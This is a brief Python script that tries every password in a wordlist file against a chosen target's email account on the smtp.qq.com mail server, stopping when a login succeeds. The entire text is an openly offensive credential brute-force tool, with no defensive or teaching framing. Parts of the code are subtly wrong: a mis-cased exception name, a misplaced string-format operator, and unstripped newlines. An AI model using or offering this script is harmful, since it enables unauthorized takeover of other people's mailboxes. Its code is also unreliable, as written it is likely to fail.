import smtplib
smtpserver = smtplib.SMTP("smtp.qq.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("enter the target`s email address: ")
passwfile = input("enter the password file name: ")
passwfile = open(passwfile,"r")

for password in passwfile:
     try:
         smtpserver.login(user,password)
         print ("[+] password found：%s"%password)
         break;
     except smtplib.SMTPauthenticationError:
         print ("[!] password Incorrect: %s") %password
